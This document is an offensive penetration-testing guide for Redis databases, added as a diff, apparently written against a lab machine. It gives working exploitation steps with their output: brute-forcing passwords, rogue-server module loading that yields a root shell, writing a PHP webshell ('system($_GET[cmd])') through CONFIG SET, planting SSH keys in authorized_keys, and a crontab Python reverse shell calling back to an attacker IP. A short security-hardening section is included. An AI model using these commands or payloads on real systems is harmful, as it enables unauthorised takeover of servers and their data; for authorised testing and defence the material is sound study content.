@@ -1,0 +1,722 @@
+
+*** REDIS DATABASE PENETRATION TESTING ***
+
+==============================================================================================================
+INDEX
+==============================================================================================================
+01. General information
+02. REDIS database penetration testing - List of attacks
+03. How to perform a network TCP ports scan to locate a REDIS database
+04. How to perform a password brute-force attack against a REDIS database
+05. How to log into a REDIS database using a valid password and extract/review its configuration
+06. How to identify and exploit database/OS privilege escalation vulnerabilities
+
+
+==============================================================================================================
+01. General information
+==============================================================================================================
+
+• Redis (Remote Dictionary Server) is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. It is an in-memory data structure project implementing a distributed, in-memory key-value database with optional durability. Redis supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, HyperLogLogs, bitmaps, streams, and spatial indexes. 
+
+• Redis maps keys to types of values. An important difference between Redis and other structured storage systems is that Redis supports not only strings, but also abstract data types:
+  + Lists of strings
+  + Sets of strings (collections of non-repeating unsorted elements)
+  + Sorted sets of strings (collections of non-repeating elements ordered by a floating-point number called score)
+  + Hash tables where keys and values are strings
+  + HyperLogLogs used for approximated set cardinality size estimation, available since Redis 2.8.9 in April 2014.[27]
+  + Stream of entries with consumer groups, allows you to store multiple fields and string values with an automatic, time-based sequence at a single key, available since Redis 5.0 in October 2018[28]
+  + Geospatial data through the implementation of the geohash technique, available since Redis 3.2.
+
+• The Redis module RedisJSON implements "the JavaScript Object Notation (JSON) Data Interchange Standard" as a native data type.
+
+• Typically, NoSQL DB's use XML, YAML, JSON, and BSON to encode the data. MongoDB uses Binary JSON (BSON).
+• NoSQL databases have their own terminology that is different from typical relational databases such as MSSQL and MySQL:
+  + Document = Row or Record
+  + Collection = Table or View
+  + Field = Column
+
+• So, a typical NoSQL database collection (table) holds one or more "documents" (records). 
+• Each document can have one or more fields (columns).
+• It's being used more and more in the production of agile applications i.e. quick to develop and deploy and often used in "big data" type projects.
+
+
+REDIS authentication
+--------------------
+• Anonymous access and protected mode
+Since version 3.2.0, when Redis is executed with the default configuration (binding all the interfaces) and without any password in order to access it, it enters a special mode called protected mode. In this mode Redis only replies to queries from the loopback interfaces, and reply to other clients connecting from other addresses with an error, explaining what is happening and how to configure Redis properly.
+The protected mode decreases the security issues caused by unprotected Redis instances executed without proper administration, however the system administrator can still ignore the error given by Redis and just disable protected mode or manually bind all the interfaces.
+
+• Authenticated mode
+When the authorization layer is enabled, Redis will refuse any query by unauthenticated clients. A client can authenticate itself by sending the AUTH command followed by the password.
+The password is set by the system administrator in clear text inside the Redis configuration file 'redis.conf' (Linux) or 'redis.windows.conf' (Windows).
+
+
+==============================================================================================================
+02. REDIS Database Penetration Testing - List of attacks
+==============================================================================================================
+
+Black-box penetration test (FROM unauthenticated attacker TO authenticated database user)
+------------------------------------------------------------------------------------------
+• Anonymous access to a REDIS database server
+• Brute-force attack to identify a weak database password
+• NoSQL injection in a Web application that allows to run unauthorized NoSQL queries to a REDIS database
+• You have compromised a server and you found a clear-text REDIS database password hardcoded in scripts, configuration files, .bash_history files or application source code. 
+• Man-In-The-Middle attack to eavesdropped clear-text credentials (e.g. ARP cache poisoning)
+• …
+
+
+Grey-box penetration test (You have the REDIS password and you want execute arbitrary OS command on the server hosting the REDIS database)
+-------------------------------------------------------------------------------------------------------------------------------------------------
+
+• Leverage the extension functionality added by Redis 4.x and 5.x to execute execute remote OS commands or gain a reverse shell 
+  > Redis RCE (<=5.x)
+    + Tool "redis-rogue-server" (https://github.com/n0b0dyCN/redis-rogue-server)
+    + Metasploit modules
+      - https://www.rapid7.com/db/modules/exploit/linux/redis/redis_unauth_exec
+      - https://www.rapid7.com/db/modules/exploit/linux/redis/redis_replication_cmd_exec
+
+• If a web server is hosted on the same Linux server than the Redis database, then we can try to add a Webshell using the command "CONFIG" in the web server folder (e.g. "/var/www/html/upload/" or "/usr/share/nginx/html/").
+  Note: the Metasploit module "auxiliary/scanner/redis/file_upload" can also be used to perform this attack.
+
+• Gain remote access to the Linux server hosting the Redis database by adding a .ssh key using the command "CONFIG"
+  + Manual exploit or using the tool "https://github.com/Avinash-acid/Redis-Server-Exploit"
+
+• Gain remote access to the Linux server hosting the Redis database by adding a malicious 'crontab' using the command "CONFIG"
+  + Manual exploit or using the Metasploit module "auxiliary/scanner/redis/file_upload"
+
+• Execute remote OS commands or gain a reverse shell using a REDIS database remote exploit (0 day or missing patches)
+
+
+==============================================================================================================
+03. How to perform a network ports scan to locate a Redis Database
+==============================================================================================================
+
+The default Redis is port is: 6379 (TCP)
+
+NMAP port scanner (https://nmap.org)
+------------------------------------
+
+  root@Security-Audit-01:~# nmap -sC -sS -sV -P0 -p- 192.168.1.104 
+
+	Nmap scan report for 192.168.1.104
+	Host is up (0.00044s latency).
+	Not shown: 65511 closed ports
+
+	PORT      STATE SERVICE     VERSION
+	<SNIP>
+	6379/tcp  open  redis       Redis key-value store 4.0.11
+	<SNIP>
+
+
+==============================================================================================================
+04. How to perform a password brute-force attack against a REDIS database
+==============================================================================================================
+
+Note: Redis database are often configured to be accessible anonymously. In this case you won't need to use any username and password. 
+If the authentication mode is enabled (the password is stored in the the Redis configuration file 'redis.conf'), then a password brute force attack can be done.
+
+
+1. NMAP - 'redis-brute' module (https://nmap.org)
+-----------------------------------------------------
+• This NSE script performs brute force password auditing against a Redis key-value store.
+  
+  $ nmap -p 6379 <ip> --script redis-brute
+	Script Output
+
+	PORT     STATE SERVICE
+	6379/tcp open  unknown
+	| redis-brute:
+	|   Accounts
+	|     toledo - Valid credentials
+	|   Statistics
+	|_    Performed 5000 guesses in 3 seconds, average tps: 1666
+
+
+2. METASPLOIT - REDIS Login Utility (Brute Force)
+---------------------------------------------------------------
+• This module attempts to brute force authentication credentials for REDIS. Note that, often REDIS does not require authentication.
+• https://www.rapid7.com/db/modules/auxiliary/scanner/redis/redis_login
+• auxiliary/scanner/redis/redis_login
+
+msf5 auxiliary(scanner/redis/redis_login) > options
+
+Module options (auxiliary/scanner/redis/redis_login):
+
+   Name              Current Setting                                                    Required  Description
+   ----              ---------------                                                    --------  -----------
+   BLANK_PASSWORDS   false                                                              no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                  yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_PASS       false                                                              no        Add all passwords in the current database to the list
+   PASSWORD          foobared                                                           no        Redis password for authentication test
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        The file that contains a list of of probable passwords.
+   RHOSTS            192.168.1.104                                                      yes       The target address range or CIDR identifier
+   RPORT             6379                                                               yes       The target port (TCP)
+   STOP_ON_SUCCESS   false                                                              yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                  yes       The number of concurrent threads
+   VERBOSE           true                                                               yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/redis/redis_login) > run
+
+[-] 192.168.1.104:6379    - 192.168.1.104:6379    - LOGIN FAILED: redis:foobared (No Auth Required: -ERR Client sent AUTH, but no password is set
+)
+[*] 192.168.1.104:6379    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(scanner/redis/redis_login) > back
+
+
+==========================================================================================================
+05. How to log into a REDIS database using a valid password and extract/review its configuration
+==========================================================================================================
+
+• Install REDIS client on Kali
+-------------------------------
+  root@Security-Audit-01:~/Desktop/# apt-get install redis-tools
+
+
+• Connect manually to a REDIS server using the 'redis-cli' command line client
+------------------------------------------------------------------------------
+
+  > redis-cli -h <hostname> -p <port>
+  > redis-cli -h <hostname> -p <port> -a <password>
+
+
+  > root@Security-Audit-01:~#  redis-cli -h 192.168.1.67
+    192.168.1.67:6379> 
+
+  > root@Security-Audit-01:~#  redis-cli -h 192.168.1.67 -p 6379 -a myredispassword
+    192.168.1.67:6379> 
+
+
+• Useful commands
+-----------------
+Once connected you can use the following commands to gather data from the server:
+
+  > info 		- Outputs server data including version, number of databases, and the number of keys in each database.
+  > select <n> 		- Select a database to work with. By default Redis has 16 databases available, 0 - 15. Typically, only 0 is used.
+  > keys <pattern> 	- Display all keys matching the regex pattern. To see all keys use *.
+  > type <key> 		- Displays the type of the value stored in the key, string, hash, set.
+  > get <key> 		- Print the value of the string key.
+  > hgetall <key> 	- Get all of the field/value pairs stored in the hash key.
+  > hget <field> <key> 	- Get the value of the specified field in the hash key.
+
+  > CONFIG GET <parameter>		- The CONFIG GET command is used to read the configuration parameters of a running Redis server. 
+  > CONFIG SET <parameter value>	- The CONFIG SET command is used in order to reconfigure the server at run time without the need to restart Redis.
+  > CONFIG REWRITE			- The CONFIG REWRITE command rewrites the redis.conf file the server was started with
+
+
+Note: The complete list of command can be found here: "https://redis.io/commands"
+
+
+• Execute REDIS command to a REDIS server using the Metasploit module 'redis_server'
+------------------------------------------------------------------------------------
+ > Redis Command Execute Scanner
+ > auxiliary/scanner/redis/redis_server 
+
+
+Example with the redis command 'INFO'
+-------------------------------------
+
+msf5 > use auxiliary/scanner/redis/redis_server 
+
+msf5 auxiliary(scanner/redis/redis_server) > options
+
+Module options (auxiliary/scanner/redis/redis_server):
+
+ 	   Name      Current Setting  Required  Description
+	   ----      ---------------  --------  -----------
+	   COMMAND   INFO             yes       The Redis command to run
+	   PASSWORD  foobared         no        Redis password for authentication test
+	   RHOSTS                     yes       The target address range or CIDR identifier
+	   RPORT     6379             yes       The target port (TCP)
+	   THREADS   1                yes       The number of concurrent threads
+
+msf5 auxiliary(scanner/redis/redis_server) > set rhosts 192.168.1.104
+rhosts => 192.168.1.104
+
+msf5 auxiliary(scanner/redis/redis_server) > run
+
+[+] 192.168.1.104:6379    - Found redis with INFO command: $2724\x0d\x0a
+
+	# Server\x0d\x0a
+	redis_version:4.0.11\x0d\x0a
+	redis_git_sha1:00000000\x0d\x0a
+	redis_git_dirty:0\x0d\x0a
+	redis_build_id:9bc1b767d9184398\x0d\x0a
+	redis_mode:standalone\x0d\x0a
+	os:Linux 3.13.0-32-generic x86_64\x0d\x0a
+	arch_bits:64\x0d\x0a
+	multiplexing_api:epoll\x0d\x0a
+	atomicvar_api:atomic-builtin\x0d\x0a
+	gcc_version:4.8.4\x0d\x0a
+	process_id:2125\x0d\x0a
+	run_id:cde119a30688ac8abd0562b7eee68626770a4174\x0d\x0a
+	tcp_port:6379\x0d\x0a
+	uptime_in_seconds:1408\x0d\x0a
+	uptime_in_days:0\x0d\x0a
+	hz:10\x0d\x0a
+	lru_clock:6600434\x0d\x0a
+	executable:/usr/bin/redis-server\x0d\x0a
+	config_file:/etc/redis/redis.conf\x0d\x0a\x0d\x0a
+
+	# Clients\x0d\x0aconnected_clients:1\x0d\x0a
+	client_longest_output_list:0\x0d\x0a
+	client_biggest_input_buf:0\x0d\x0ab
+	locked_clients:0\x0d\x0a\x0d\x0a
+
+	# Memory\x0d\x0a
+	used_memory:849432\x0d\x0a
+	used_memory_human:829.52K\x0d\x0a
+	used_memory_rss:7643136\x0d\x0a
+	used_memory_rss_human:7.29M\x0d\x0a
+	used_memory_peak:849432\x0d\x0a
+	used_memory_peak_human:829.52K\x0d\x0a
+	used_memory_peak_perc:105.20%\x0d\x0a
+	used_memory_overhead:836198\x0d\x0a
+	used_memory_startup:786568\x0d\x0a
+	used_memory_dataset:13234\x0d\x0a
+	used_memory_dataset_perc:21.05%\x0d\x0a
+	total_system_memory:2099126272\x0d\x0a
+	total_system_memory_human:1.95G\x0d\x0a
+	used_memory_lua:37888\x0d\x0a
+	used_memory_lua_human:37.00K\x0d\x0a
+	maxmemory:0\x0d\x0a
+	maxmemory_human:0B\x0d\x0a
+	maxmemory_policy:noeviction\x0d\x0a
+	mem_fragmentation_ratio:9.00\x0d\x0a
+	mem_allocator:jemalloc-4.0.3\x0d\x0a
+	active_defrag_running:0\x0d\x0a
+	lazyfree_pending_objects:0\x0d\x0a\x0d\x0a
+
+	# Persistence\x0d\x0a
+	loading:0\x0d\x0a
+	rdb_changes_since_last_save:0\x0d\x0a
+	rdb_bgsave_in_progress:0\x0d\x0a
+	rdb_last_save_time:1550102898\x0d\x0a
+	rdb_last_bgsave_status:ok\x0d\x0a
+	rdb_last_bgsave_time_sec:-1\x0d\x0a
+	rdb_current_bgsave_time_sec:-1\x0d\x0a
+	rdb_last_cow_size:0\x0d\x0a
+	aof_enabled:0\x0d\x0a
+	aof_rewrite_in_progress:0\x0d\x0a
+	aof_rewrite_scheduled:0\x0d\x0a
+	aof_last_rewrite_time_sec:-1\x0d\x0a
+	aof_current_rewrite_time_sec:-1\x0d\x0a
+	aof_last_bgrewrite_status:ok\x0d\x0a
+	aof_last_write_status:ok\x0d\x0a
+	aof_last_cow_size:0\x0d\x0a\x0d\x0a
+
+	# Stats\x0d\x0a
+	total_connections_received:2\x0d\x0a
+	total_commands_processed:1\x0d\x0a
+	instantaneous_ops_per_sec:0\x0d\x0a
+	total_net_input_bytes:42\x0d\x0a
+	total_net_output_bytes:47\x0d\x0a
+	instantaneous_input_kbps:0.00\x0d\x0a
+	instantaneous_output_kbps:0.00\x0d\x0a
+	rejected_connections:0\x0d\x0a
+	sync_full:0\x0d\x0a
+	sync_partial_ok:0\x0d\x0a
+	sync_partial_err:0\x0d\x0a
+	expired_keys:0\x0d\x0a
+	expired_stale_perc:0.00\x0d\x0a
+	expired_time_cap_reached_count:0\x0d\x0a
+	evicted_keys:0\x0d\x0a
+	keyspace_hits:0\x0d\x0a
+	keyspace_misses:0\x0d\x0a
+	pubsub_channels:0\x0d\x0a
+	pubsub_patterns:0\x0d\x0a
+	latest_fork_usec:0\x0d\x0a
+	migrate_cached_sockets:0\x0d\x0a
+	slave_expires_tracked_keys:0\x0d\x0a
+	active_defrag_hits:0\x0d\x0a
+	active_defrag_misses:0\x0d\x0a
+	active_defrag_key_hits:0\x0d\x0a
+	active_defrag_key_misses:0\x0d\x0a\x0d\x0a
+
+	# Replication\x0d\x0a
+	role:master\x0d\x0a
+	connected_slaves:0\x0d\x0a
+	master_replid:f557e5328f56646d4b707be07c9ba9a581969efa\x0d\x0a
+	master_replid2:0000000000000000000000000000000000000000\x0d\x0a
+	master_repl_offset:0\x0d\x0a
+	second_repl_offset:-1\x0d\x0a
+	repl_backlog_active:0\x0d\x0a
+	repl_backlog_size:1048576\x0d\x0a
+	repl_backlog_first_byte_offset:0\x0d\x0a
+	repl_backlog_histlen:0\x0d\x0a\x0d\x0a
+
+	# CPU\x0d\x0a
+	used_cpu_sys:3.33\x0d\x0a
+	used_cpu_user:1.84\x0d\x0a
+	used_cpu_sys_children:0.00\x0d\x0a
+	used_cpu_user_children:0.00\x0d\x0a\x0d\x0a
+
+	# Cluster\x0d\x0a
+	cluster_enabled:0\x0d\x0a\x0d\x0a
+
+	# Keyspace
+	[*] 192.168.1.104:6379    - Scanned 1 of 1 hosts (100% complete)
+	[*] Auxiliary module execution completed
+
+
+
+• Nmap module: 'redis-info'
+---------------------------
+
+   $ nmap --script redis-info -sV -p 6379 <IP>
+  
+	PORT     STATE SERVICE
+	6379/tcp open  unknown
+	| redis-info:
+	|   Version            2.2.11
+	|   Architecture       64 bits
+	|   Process ID         17821
+	|   Used CPU (sys)     2.37
+	|   Used CPU (user)    1.02
+	|   Connected clients  1
+	|   Connected slaves   0
+	|   Used memory        780.16K
+	|   Role               master
+	|   Bind addresses:
+	|     192.168.121.101
+	|   Active channels:
+	|     testChannel
+	|     bidChannel
+	|   Client connections:
+	|     192.168.171.101
+	|_    72.14.177.105
+
+   $ nmap --script redis-info -sV -p 6379 <IP>
+
+	PORT     STATE SERVICE
+	6379/tcp open  unknown
+	| redis-info: 
+	|   Version            2.8.17
+	|   Operating System   Linux 4.0.0-kali1-amd64 x86_64
+	|   Architecture       64 bits
+	|   Process ID         8020
+	|   Used CPU (sys)     0.04
+	|   Used CPU (user)    0.06
+	|   Connected clients  1
+	|   Connected slaves   0
+	|   Used memory        491.84K
+	|_  Role               master
+
+
+
+
+• Security Checks (https://redis.io/topics/security + Configuration file 'REDIS.CONF')
+======================================================================================
+
+• Principle of least privilege (PoLP)
+=> Redis does not requires root privileges to run. It is recommended to run it as an unprivileged redis user that is only used for this purpose. The Redis authors are currently investigating the possibility of adding a new configuration parameter to prevent CONFIG SET/GET dir and other similar run-time configuration directives. This would prevent clients from forcing the server to write Redis dump files at arbitrary locations.
+
+• Network security
+=> Access to the Redis port should be denied to everybody but trusted clients in the network, so the servers running Redis should be directly accessible only by the computers implementing the application using Redis
+=> Example: bind Redis to a single interface by adding a line like the following to the redis.conf file: "bind 127.0.0.1"
+
+• Protected mode
+=> when Redis is executed with the default configuration (binding all the interfaces) and without any password in order to access it, it enters a special mode called protected mode. In this mode Redis only replies to queries from the loopback interfaces, and reply to other clients connecting from other addresses with an error, explaining what is happening and how to configure Redis properly.
+
+• Authenticated mode
+=> When the authorization layer is enabled, Redis will refuse any query by unauthenticated clients. A client can authenticate itself by sending the AUTH command followed by the password.
+=> A robust password must be set by the system administrator in clear text inside the Redis configuration file 'redis.conf' (Linux) or 'redis.windows.conf' (Windows).
+For example:
+"requirepass MyStrongRedisPassword45è§(:"
+
+• TLS support
+=> Redis has optional support for TLS on all communication channels, including client connections, replication links and the Redis Cluster bus protocol.
+
+• Disabling of specific commands
+=> It is possible to disable commands in Redis or to rename them into an unguessable name, so that normal clients are limited to a specified set of commands.
+=> For instance, a virtualized server provider may offer a managed Redis instance service. In this context, normal users should probably not be able to call the Redis CONFIG command to alter the configuration of the instance, but the systems that provide and remove instances should be able to do so.
+
+• String escaping and NoSQL injection
+=> The Redis protocol has no concept of string escaping, so injection is impossible under normal circumstances using a normal client library. The protocol uses prefixed-length strings and is completely binary safe.
+=> Lua scripts executed by the EVAL and EVALSHA commands follow the same rules, and thus those commands are also safe.
+While it would be a very strange use case, the application should avoid composing the body of the Lua script using strings obtained from untrusted sources.
+
+
+
+==========================================================================================================
+06. How to identify and exploit database/OS privilege escalation vulnerabilities
+==========================================================================================================
+
+
+Method 1. • Leverage the extension functionality added by Redis 4.x and 5.x to execute execute remote OS commands or gain a reverse shell 
+=========================================================================================================================================
+ 
+• Redis RCE (<=5.x) using the tool "redis-rogue-server" 
+----------------------------------------------------------
+  > https://github.com/n0b0dyCN/redis-rogue-server)
+  > https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so
+  > https://raw.githubusercontent.com/n0b0dyCN/redis-rogue-server/master/redis-rogue-server.py
+
+
+root@Security-Audit-01:~/Desktop/redis/# wget https://raw.githubusercontent.com/n0b0dyCN/redis-rogue-server/master/redis-rogue-server.py
+--2019-08-06 03:12:57--  https://raw.githubusercontent.com/n0b0dyCN/redis-rogue-server/master/redis-rogue-server.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.120.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.120.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7019 (6.9K) [text/plain]
+Saving to: ‘redis-rogue-server.py’
+redis-rogue-server.py                              100%[==============================================================================================================>]   6.85K  --.-KB/s    in 0s      
+2019-08-06 03:12:57 (74.1 MB/s) - ‘redis-rogue-server.py’ saved [7019/7019]
+
+
+
+root@Security-Audit-01:~/Desktop/redis/# python3 redis-rogue-server.py --rhost=192.168.1.104 --rport=6379 --lhost 192.168.1.9
+______         _ _      ______                         _____                          
+| ___ \       | (_)     | ___ \                       /  ___|                         
+| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
+|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
+| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
+\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
+                                     __/ |                                            
+                                    |___/                                             
+@copyright n0b0dy @ r3kapig
+
+[info] TARGET 192.168.1.104:6379
+[info] SERVER 192.168.1.9:21000
+[info] Setting master...
+[info] Setting dbfilename...
+[info] Loading module...
+[info] Temerory cleaning up...
+What do u want, [i]nteractive shell or [r]everse shell: i
+[info] Interact mode start, enter "exit" to quit.
+
+[<<] id
+[>>] uid=0(root) gid=0(root) groups=0(root)
+
+[<<] whoami
+[>>] root
+
+[<<] hostname
+[>>] typhoon.local
+
+[<<] ifconfig
+[>>] docker0   Link encap:Ethernet  HWaddr 02:42:b4:d5:30:39  
+[>>]           inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
+[>>]           UP BROADCAST MULTICAST  MTU:1500  Metric:1
+[>>]           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+[>>]           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+[>>]           collisions:0 txqueuelen:0 
+[>>]           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+[>>] eth0      Link encap:Ethernet  HWaddr 08:00:27:34:bf:f6  
+[>>]           inet addr:192.168.1.104  Bcast:192.168.1.255  Mask:255.255.255.0
+[>>]           inet6 addr: 2a01:e35:2fef:d7e0:65b2:dcdc:5bdd:3e46/64 Scope:Global
+[>>]           inet6 addr: 2a01:e35:2fef:d7e0:a00:27ff:fe34:bff6/64 Scope:Global
+[>>]           inet6 addr: fe80::a00:27ff:fe34:bff6/64 Scope:Link
+[>>]           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+[>>]           RX packets:138 errors:0 dropped:0 overruns:0 frame:0
+[>>]           TX packets:215 errors:0 dropped:0 overruns:0 carrier:0
+[>>]           collisions:0 txqueuelen:1000 
+[>>]           RX bytes:58972 (58.9 KB)  TX bytes:25527 (25.5 KB)
+[>>] lo        Link encap:Local Loopback  
+[>>]           inet addr:127.0.0.1  Mask:255.0.0.0
+[>>]           inet6 addr: ::1/128 Scope:Host
+[>>]           UP LOOPBACK RUNNING  MTU:65536  Metric:1
+[>>]           RX packets:60 errors:0 dropped:0 overruns:0 frame:0
+[>>]           TX packets:60 errors:0 dropped:0 overruns:0 carrier:0
+[>>]           collisions:0 txqueuelen:0 
+[>>]           RX bytes:24757 (24.7 KB)  TX bytes:24757 (24.7 KB)
+[>>] virbr0    Link encap:Ethernet  HWaddr de:7a:43:e7:f0:5f  
+[>>]           inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
+[>>]           UP BROADCAST MULTICAST  MTU:1500  Metric:1
+[>>]           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+[>>]           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+[>>]           collisions:0 txqueuelen:0 
+[>>]           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+[<<] 
+
+
+Metasploit modules "redis_unauth_exec" and "redis_replication_cmd_exec"
+-------------------------------------------------------------------------
+
+These 2 Metasploit modules can be used to leverage the extension functionality added by Redis 4.x and 5.x to execute arbitrary code. 
+To transmit the given extension it makes use of the feature of Redis which called replication between master and slave.
+
+=> https://www.rapid7.com/db/modules/exploit/linux/redis/redis_replication_cmd_exec
+=> https://www.rapid7.com/db/modules/exploit/linux/redis/
+
+
+
+Method 2. Gain remote OS command on the Linux server hosting the Redis database by adding a Webshell
+====================================================================================================
+
+• If a web server is hosted on the same Linux server than the Redis database, then we can try to add a Webshell using the commands CONFIG and SET in the web server folder (e.g. "/var/www/html/upload/" or "/usr/share/nginx/html/").
+
+Manual exploitation
+-------------------
+=> Example of commands to add a PHP Webshell on a web server hosted on the same Linux server than the REDIS database 
+
+root@Security-Audit-01:~/Desktop/# redis-cli -h 192.168.1.104
+
+192.168.1.104:6379> config set dir /var/www/html/uploads/
+OK
+192.168.1.104:6379> config set dbfilename webshell.php
+OK
+192.168.1.104:6379> set test "<?php system($_GET[cmd]); ?>"
+OK
+192.168.1.104:6379> save
+OK
+
+=> curl http://192.168.1.104/uploads/webshell.php?cmd=ipconfig
+
+
+Metasploit's module 'auxiliary/scanner/redis/file_upload'
+---------------------------------------------------------
+
+msf5 > use auxiliary/scanner/redis/file_upload
+
+msf5 auxiliary(scanner/redis/file_upload) > options
+
+Module options (auxiliary/scanner/redis/file_upload):
+
+   Name                    Current Setting                              Required  Description
+   ----                    ---------------                              --------  -----------
+   DISABLE_RDBCOMPRESSION  true                                         yes       Disable compression when saving if found to be enabled
+   FLUSHALL                false                                        yes       Run flushall to remove all redis data before saving
+   LocalFile               /tmp/webshell.php				no        Local file to be uploaded
+   PASSWORD                foobared                                     no        Redis password for authentication test
+   RHOSTS                  192.168.1.104                                yes       The target address range or CIDR identifier
+   RPORT                   6379                                         yes       The target port (TCP)
+   RemoteFile              /var/www/html/uploads/webshell.php           no        Remote file path
+   THREADS                 1                                            yes       The number of concurrent threads
+
+msf5 auxiliary(scanner/redis/file_upload) > run
+
+[+] 192.168.1.104:6379    - 192.168.1.104:6379    -- saved 398 bytes inside of redis DB at /var/www/html/uploads/webshell.php 
+[*] 192.168.1.104:6379    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/redis/file_upload) > 
+
+
+
+Method 3. Gain remote access to the Linux server hosting the Redis database by adding a SSH key
+================================================================================================
+
+• Add your .ssh keys in "/home/<user>/.ssh/authorized_keys" or in "/root/.ssh/authorized_keys"
+
+Manual test
+------------
+
+Step 1. Generate a ssh public-private key pair 
+	# ssh-keygen -t rsa
+
+Step 2. Write the public key to a file 
+
+	# (echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
+
+Step 3. Import the file into redis
+
+	# cat foo.txt | redis-cli -h 10.85.0.52 -x set crackit
+
+Step 4. Save the public key to the authorized_keys file on redis server
+
+	# redis-cli -h 192.168.1.104
+	192.168.1.104:6379> config set dir /root/.ssh/
+	OK
+	192.168.1.104:6379> config set dbfilename "authorized_keys"
+	OK
+	192.168.1.104:6379> save
+	OK
+
+Step 5.  Log into the Linux server hosting the REDIS DB with your private key : ssh -i id_rsa root@192.168.1.104
+
+=> Note: I add sometimes problems with this technique. My SSH key was added in the file "authorized_keys" but with a "blob". As a result, the attack failed and I could not login.  
+
+
+Using the Metasploit's module 'auxiliary/scanner/redis/file_upload'
+-------------------------------------------------------------------
+
+msf5 > use auxiliary/scanner/redis/file_upload
+
+msf5 auxiliary(scanner/redis/file_upload) > options
+
+Module options (auxiliary/scanner/redis/file_upload):
+
+   Name                    Current Setting                              Required  Description
+   ----                    ---------------                              --------  -----------
+   DISABLE_RDBCOMPRESSION  true                                         yes       Disable compression when saving if found to be enabled
+   FLUSHALL                false                                        yes       Run flushall to remove all redis data before saving
+   LocalFile               /root/Desktop/CTFs/Typhoon/redis/id_rsa.pub  no        Local file to be uploaded
+   PASSWORD                foobared                                     no        Redis password for authentication test
+   RHOSTS                  192.168.1.104                                yes       The target address range or CIDR identifier
+   RPORT                   6379                                         yes       The target port (TCP)
+   RemoteFile              /home/typhoon/.ssh/authorized_keys           no        Remote file path
+   THREADS                 1                                            yes       The number of concurrent threads
+
+msf5 auxiliary(scanner/redis/file_upload) > run
+
+[+] 192.168.1.104:6379    - 192.168.1.104:6379    -- saved 377 bytes inside of redis DB at /home/typhoon/.ssh/authorized_keys
+[*] 192.168.1.104:6379    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/redis/file_upload) > 
+
+
+Other - Redis-Server-Exploit
+-----------------------------
+=> https://github.com/Avinash-acid/Redis-Server-Exploit
+
+
+Method 4. Gain remote access to the Linux server hosting the Redis database by adding a malicious 'crontab'
+============================================================================================================
+
+Manual test
+------------
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/redis/redis-3.0.0# apt-get install redis-tools
+
+echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.9\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 192.168.1.104 -x set 1
+
+redis-cli -h 192.168.1.104 config set dir /var/spool/cron/crontabs/
+
+redis-cli -h 192.168.1.104 config set dbfilename root
+
+redis-cli -h 192.168.1.104 save
+
+=> Note: I add sometimes problems with this technique. My new cron job was added but with a "blob" and as a result, the attack failed.
+
+
+Using the Metasploit's module 'auxiliary/scanner/redis/file_upload'
+-------------------------------------------------------------------
+msf5 auxiliary(scanner/redis/file_upload) > options
+
+Module options (auxiliary/scanner/redis/file_upload):
+
+   Name                    Current Setting                              Required  Description
+   ----                    ---------------                              --------  -----------
+   DISABLE_RDBCOMPRESSION  true                                         yes       Disable compression when saving if found to be enabled
+   FLUSHALL                false                                        yes       Run flushall to remove all redis data before saving
+   LocalFile               /root/Desktop/CTFs/Typhoon/redis/id_rsa.pub  no        Local file to be uploaded
+   PASSWORD                foobared                                     no        Redis password for authentication test
+   RHOSTS                  192.168.1.104                                yes       The target address range or CIDR identifier
+   RPORT                   6379                                         yes       The target port (TCP)
+   RemoteFile              /root/.ssh/authorized_keys                   no        Remote file path
+   THREADS                 1                                            yes       The number of concurrent threads
+
+msf5 auxiliary(scanner/redis/file_upload) > run
+
+[+] 192.168.1.104:6379    - 192.168.1.104:6379    -- saved 398 bytes inside of redis DB at /root/.ssh/authorized_keys
+[*] 192.168.1.104:6379    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/redis/file_upload) > 
+
+
+
+OTHER - Master-Slave Module
+==============================
+• The master redis all operations are automatically synchronized to the slave redis, which means that we can regard the vulnerability redis as a slave redis, connected to the master redis which our own controlled, then we can enter the command to our own redis.
+
+Example:
+-------
+master redis : 10.85.0.51 (Hacker's Server)
+slave  redis : 10.85.0.52 (Target Vulnerability Server)
